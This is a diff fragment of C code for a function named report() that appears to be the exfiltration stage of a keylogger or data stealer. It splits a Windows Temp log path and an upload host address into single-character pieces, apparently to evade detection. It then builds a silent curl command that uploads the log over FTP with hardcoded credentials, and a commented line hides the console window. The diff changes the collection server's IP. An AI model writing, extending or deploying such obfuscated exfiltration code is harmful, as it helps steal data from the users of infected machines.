@@ -191,7 +191,7 @@ int report(){
 	//ShowWindow(GetConsoleWindow(),SW_HIDE);
 
 
-	char full_string_2[50];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\log.log
+	char full_string_2[100];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\log.log
 	char part_string_2_1[] = "\\";
 	char part_string_2_2[] = "??";
 	char part_string_2_3[] = "\\";
@@ -283,7 +283,7 @@ int report(){
 	strcat(full_string_3, part_string_3_3);
   
   
- 	char full_string_4[100];	// 192.168.8.161
+ 	char full_string_4[100];	// 192.168.100.13
 	char part_string_4_1[] = "1";
 	char part_string_4_2[] = "9";
 	char part_string_4_3[] = "2.";
@@ -291,11 +291,11 @@ int report(){
 	char part_string_4_5[] = "6";
 	char part_string_4_6[] = "8";
 	char part_string_4_7[] = ".";
-	char part_string_4_8[] = "8";
-	char part_string_4_9[] = ".";
-	char part_string_4_10[] = "1";
-	char part_string_4_11[] = "6";
-	char part_string_4_12[] = "1";
+	char part_string_4_8[] = "1";
+	char part_string_4_9[] = "0";
+	char part_string_4_10[] = "0";
+	char part_string_4_11[] = ".1";
+	char part_string_4_12[] = "3";
 	strcpy(full_string_4, part_string_4_1);
 	strcat(full_string_4, part_string_4_2);
 	strcat(full_string_4, part_string_4_3);
@@ -417,7 +417,7 @@ int report(){
 	
 	char curlCommand[512];
 
-	//curl --ftp-ssl-reqd -T test_ftp_ssl.txt -u "ftp_user:123" "ftp://192.168.8.161/uploads/test_ftp_ssl.txt" -k -s
+	//curl --ftp-ssl-reqd -T test_ftp_ssl.txt -u "ftp_user:123" "ftp://192.168.100.13/uploads/test_ftp_ssl.txt" -k -s
     snprintf(curlCommand, sizeof(curlCommand),
              "%s %s -T \"%s\" %s://%s/%s/%s %s \"%s\" %s %s",
              full_string_8,full_string_7,full_string_2,full_string_3,full_string_4,full_string_5,full_string_1,full_string_9,full_string_6,full_string_10,full_string_11);
